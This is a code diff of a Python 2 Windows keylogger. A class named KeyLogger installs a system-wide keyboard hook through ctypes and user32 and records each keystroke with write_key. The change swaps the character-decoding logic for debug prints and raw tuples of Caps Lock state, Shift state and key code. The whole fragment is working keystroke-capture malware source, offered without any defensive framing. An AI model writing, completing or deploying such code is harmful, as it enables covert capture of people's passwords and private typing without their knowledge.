@@ -156,6 +156,7 @@ def get_fptr(fn):
     cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
     return cmpfunc(fn)
 
+
 class KeyLogger:
     def __init__(self):
         self.hooked = None
@@ -171,6 +172,7 @@ class KeyLogger:
             return
         ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
+
 
 class Key(threading.Thread):
     def __init__(self):
@@ -190,22 +192,11 @@ class Key(threading.Thread):
         if w_param is not 0x0100:
             return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
-        if keycodes.has_key(l_param[0]):
-            key = keycodes[l_param[0]]
-        else:
-            if User32.GetKeyState(0x14) & 1:
-                if User32.GetKeyState(0x10) & 0x8000:
-                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
-                        l_param[0]).lower()
-                else:
-                    key = update_key(l_param[0]).upper()
-            else:
-                if User32.GetKeyState(0x10) & 0x8000:
-                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
-                        l_param[0]).upper()
-                else:
-                    key = update_key(l_param[0]).lower()
-        self.write_key(key)
+        print User32.GetKeyState(0x14) & 1
+        print User32.GetKeyState(0x10) & 0x8000
+        print l_param[0]
+
+        self.write_key((User32.GetKeyState(0x14) & 1, User32.GetKeyState(0x10) & 0x8000, l_param[0]))
 
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
